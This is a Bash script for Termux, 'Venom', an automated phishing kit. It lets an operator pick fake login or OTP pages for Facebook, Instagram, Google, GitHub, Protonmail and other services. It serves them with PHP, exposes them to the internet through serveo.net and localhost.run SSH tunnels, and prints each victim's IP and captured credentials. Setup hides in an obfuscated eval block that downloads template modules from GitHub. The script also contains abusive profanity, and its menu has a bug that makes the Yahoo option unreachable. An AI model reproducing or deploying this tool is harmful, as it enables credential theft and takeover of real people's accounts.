#!/data/data/com.termux/files/usr/bin/bash

##   Venom 	: 	Automated Phishing Tool
##   Author 	: 	https://t.me/nullxvoid 
##   Version 	: 	1.0-test

# Checking Internet connection
ping -c 1 google.com >/dev/null 2>&1
if [ "$?" != '0' ]; then
  printf "Internet tera baap on karega madarchod!!\n"
  exit 1
fi 

# Requirements
z="
";XBz='tall';mBz='php ';Dz='l -s';kz='n';Nz='raw/';QCz='tar ';VCz='.gz ';pz='abhi';hz='=Ali';xBz='ps:/';jBz='apt ';aCz='rm -';ACz='hub.';BBz='t ch';iBz='"';HCz='ses/';QBz='odul';Gz='//gi';Kz='n4Yo';Oz='main';NBz='fi';qz=' to ';fBz='ke s';DCz='4You';Xz='" | ';oz='31mK';bz='if [';UCz='.tar';SCz=' mod';cBz='nts.';Iz='.com';TCz='ules';vBz=' -LO';lz='echo';Ez='L ht';rBz='v/nu';sBz='ll 2';tz='code';HBz=' of ';KCz='/v1.';IBz='a bi';Vz='enkr';Hz='thub';wBz=' htt';Wz='ishn';YBz='ig a';nBz='open';RCz='-zxf';yz='d\nD';SBz=']]; ';Bz='or=$';gz='THOR';EBz='dits';eBz='y ta';lBz='all ';ez='r -n';NCz='es.t';cz='[ $a';FBz=' you';XCz='ev/n';uBz='curl';Sz='grep';iz=' ]];';bCz='rf m';ECz='/Ven';xz='rcho';BCz='com/';KBz='slee';nz='"\e[';GCz='elea';Jz='/Ano';oBz='ssh ';MBz='exit';DBz=' cre';Mz='nom/';Fz='tps:';ABz='o no';TBz='then';Qz='om.s';VBz='else';YCz='ull ';MCz='st/m';pBz='-y >';OCz='ar.g';Cz='(cur';sz=' se ';aBz='equi';RBz='es" ';Uz='"Ali';hBz='time';Pz='/ven';LBz='p 3';GBz=' son';Zz=' -n1';rz='khud';jz=' the';uz=' kar';PCz='z';ZCz='2>&1';gBz='ome ';bBz='reme';JCz='load';ZBz='ll r';Lz='u/Ve';az=')';Tz=' -w ';LCz='0-te';mz=' -e ';OBz='[ -d';UBz=' ""';yBz='/git';PBz=' ".M';FCz='om/r';WBz='"Ins';ICz='down';dBz='. ma';wz='mada';Az='auth';Rz='h | ';dz='utho';WCz='> /d';Yz='head';kBz='inst';qBz=' /de';vz=' le ';fz='e AU';JBz='tch"';CCz='Anon';tBz='>&1';CBz='nage';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz$dz$ez$fz$gz$hz$Vz$Wz$iz$jz$kz$z$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$jz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$KBz$LBz$z$MBz$z$NBz$z$bz$OBz$PBz$QBz$RBz$SBz$TBz$z$lz$UBz$z$VBz$z$lz$mz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$z$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$z$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$QBz$NCz$OCz$PCz$z$QCz$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$z$aCz$bCz$QBz$NCz$OCz$PCz$z$NBz"

# Banner & Menu Don't change Author name
main(){
clear
echo -e "\e[31m
 ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░     ░  ░         ░     ░ ░         ░   
     ░                                \e[34mVer 1.0-test\e[0m\e[32m     

AUTHOR:Alienkrishn

\e[33;1m Sellect \e[34;1mvector \e[33;1mFor Your Victim\e[0;1m

[1] Facebook         [11] Google
[2] Inatagram        [12] Microsoft
[3] Twitter          [13] Yahoo
[4] Tiktok           [14] Yandex
[5] Pintrest         [15] Github
[6] Snapchat         [16] Gitlab
[7] Linkedin         [17] Mediafire
[8] VK               [18] Protonmail
[9] Reddit           [19] About
[10] Discord         [20] Exit
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mVector\e[0m) > ' vector 
if [[ $vector == 1 ]]; then
  facebook
  elif [[ $vector == 2 ]]; then
    instagram
  elif [[ $vector == 3 ]]; then
    twitter
  elif [[ $vector == 4 ]]; then
    tiktok
  elif [[ $vector == 5 ]]; then
    pintrest
  elif [[ $vector == 6 ]]; then
    snapchat
  elif [[ $vector == 7 ]]; then
    linkedin
  elif [[ $vector == 8 ]]; then
    vk
  elif [[ $vector == 9 ]]; then
    reddit
  elif [[ $vector == 10 ]]; then
    discord
  elif [[ $vector == 11 ]]; then
    google
  elif [[ $vector == 12 ]]; then
    microsoft
  elif [[ $vector == 14 ]]; then
    yahoo
  elif [[ $vector == 14 ]]; then
    yandex
  elif [[ $vector == 15 ]]; then
    github
  elif [[ $vector == 16 ]]; then
    gitlab
  elif [[ $vector == 17 ]]; then
    mediafire
  elif [[ $vector == 18 ]]; then
    protonmail
  elif [[ $vector == 19 ]]; then
    about
  elif [[ $vector == 20 ]]; then
    echo -e "Thanks for using this tool byee!";sleep 2
    exit
  else
    echo -e "Andha hai kya laude..try again";sleep 2
    main
fi
}

facebook(){
  echo -e "\e[0;1m 
[1] Traditional Login Page
[2] Advance voting poll
[3] Fake security page
[4] Messenger Login Page
[5] Facebook OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mFacebook/Vector\e[0m) > ' fb_option
if [[ $fb_option == 1 ]]; then
  website="facebook"
  hosting
  elif [[ $fb_option == 2 ]]; then
    website="fb_advanced"
    hosting
  elif [[ $fb_option == 3 ]]; then
    website="fb_security"
    hosting
  elif [[ $fb_option == 4 ]]; then
    website="fb_messenger"
    hosting
  elif [[ $fb_option == 5 ]]; then
    website="facebook_otp"
    hosting
fi
}

instagram(){
  echo -e "\e[0;1m 
[1] Traditional Login page
[2] Insta follower(1)
[3] Insta follower(2)
[4] Insta Verify
[5] Insta follow OTP
[6] Instagram OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mInsta/Vector\e[0m) > ' ig_option
if [[ $ig_option == 1 ]]; then
  website="instagram"
  hosting 
  elif [[ $ig_option == 2 ]]; then
    website="ig_followers"
    hosting
  elif [[ $ig_option == 3 ]]; then
    website="insta_followers"
    hosting
  elif [[ $ig_option == 4 ]]; then
    website="ig_verify"
    hosting
  elif [[ $ig_option == 5 ]]; then
    website="igfollow_otp"
    hosting 
  elif [[ $ig_option == 6 ]]; then
    website="instagram_otp"
    hosting  
fi
}

twitter(){
  echo -e "
[1] Traditional login page
[2] Twitter OTP page
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mTwitter/Vector\e[0m) > ' tw_option
if [[ $tw_option == 1 ]]; then
  website="twitter"
  hosting
elif [[ $tw_option == 2 ]]; then
  website="twitter_otp"
  hosting
fi
}

tiktok(){
  echo -e "
[1] Traditional login page
[2] Tiktok OTP page
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mTiktok/Vector\e[0m) > ' tk_option
if [[ $tk_option == 1 ]]; then
  website="tiktok"
  hosting
elif [[ $tk_option == 2 ]]; then
  website="tiktok_otp"
  hosting
fi
}

pintrest(){
echo -e "
[1] Traditional login page
[2] Pintrest OTP page 
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mPintrest/Vector\e[0m) > ' pin_option
if [[ $pin_option == 1 ]]; then
  website="pintrest"
  hosting
elif [[ $pin_option == 2 ]]; then
  website="pintrest_otp"
  hosting
  
fi
}

snapchat(){
echo -e "
[1] Traditional login page
[2] Snapchat2 login page
[3] Snapchat OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mSnapchat/Vector\e[0m) > ' snp_option
if [[ $snp_option == 1 ]]; then
  website="snapchat"
  hosting
elif [[ $snp_option == 2 ]]; then
  website="Snapchat2"
  hosting
elif [[ $snp_option == 3 ]]; then
  website="snapchat_otp"
  hosting
fi
}

linkedin(){
echo -e "
[1] Traditional Login page
[2] Linkedin OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mLinkedin/Vector\e[0m) > ' lnk_option
if [[ $lnk_option == 1 ]]; then
  website="linkedin"
  hosting
elif [[ $lnk_option == 2 ]]; then
  website="linkedin_otp"
  hosting
fi
}

vk(){
echo -e "
[1] Traditional login page
[2] VK poll
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mVK/Vector\e[0m) > ' vk_option
if [[ $vk_option == 1 ]]; then
  website="vk"
  hosting
elif [[ $vk_option == 2 ]]; then
  website="vk_poll"
  hosting
fi
}

reddit(){
website="reddit"
hosting
}

discord(){
website="discord"
hosting
}

google(){
echo -e "
[1] Traditional login page
[2] Google old login
[3] Google OTP
[4] Google poll
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mGoogle/Vector\e[0m) > ' ggl_option
if [[ $ggl_option == 1 ]]; then
  website="google"
  hosting
elif [[ $ggl_option == 2 ]]; then
  website="google_old"
  hosting
elif [[ $ggl_option == 3 ]]; then
  website="google_otp"
  hosting
elif [[ $ggl_option == 4 ]]; then
  website="google_poll"
  hosting
fi
}

microsoft(){
website="microsoft"
hosting
}

yahoo(){
website='yahoo'
hosting
}

yandex(){
website="yandex"
hosting
}

github(){
echo -e "
[1] Traditional login page
[2] Github OTP
"
read -p $'\e[31;4mVenom\e[0m set(\e[33mGithub/Vector\e[0m) > ' gt_option
if [[ $gt_option == 1 ]]; then
  website="github"
  hosting
elif [[ $gt_option == 2 ]]; then
  website="github_otp"
  hosting
fi
}

gitlab(){
website="gitlab"
hosting
}

mediafire(){
website="mediafire"
hosting
}

protonmail(){
website="protonmail"
hosting
}

about(){
echo -e "
An automated phishing tool with 15+ templates.
This Tool is made for educational purpose only.
Author will not be responsible for any misuse of this toolkit.

Version : 1.0-test
Coded By : Alienkrishn [Anon4You]
Github : https://github.com/Anon4You/Venom 

"
}

hosting(){
  if [[ -d ".vnm" ]]; then
    rm -rf .vnm && mkdir .vnm
    else
      mkdir .vnm
  fi
  cp -rf .Modules/$website .vnm
  echo -e "\nif links are not shown relaunch the script $0\n"
  sleep 2
  printf "\e[32;1mStarting PHP server...\r"
  php -S localhost:8080 -t .vnm/$website > /dev/null 2>&1 &
  sleep 2
  printf "Starting serveo.net...\r"
  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
  sleep 10
  printf "Starting localhost.run...\r"
  ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
  sleep 10
  link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
  lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
  rm -rf .lhrlog .srvlog
  echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
  echo Serveo.net : $link
  echo ""
  echo Localhost.run : $lhlink
  echo -e "\nLocalHost  : http://localhost:8080"
  datafound
}

datafound(){
  echo -e "\n\e[31;1mWaiting for logim info, press CTRL+C to stop\e[0m\n"
  while [[ true ]]; do
    if [[ -e ".vnm/$website/ip.txt" ]]; then
      echo -e "\e[32;1mVictim ip found!\e[0m"
      cat .vnm/$website/ip.txt
      rm -rf .vnm/$website/ip.txt
    fi 
    sleep 0.75
    if [[ -e ".vnm/$website/usernames.txt" ]]; then
      echo -e "\n\e[32;1mLogin info found!\e[0m"
      cat .vnm/$website/usernames.txt
      rm -rf .vnm/$website/usernames.txt
      echo -e "\n\e[31;1mWaiting for next login info press CTRL+C to exit\e[0m\n"
    fi 
    sleep 0.75
  done
}

usr_intrp(){
  printf "\e[0m\e[1;36m\t CTRL+C Pressed!, Exiting...\n"
  rm -rf .vnm
  sleep 2
  exit
}

trap usr_intrp SIGINT
trap usr_intrp SIGTSTP
main
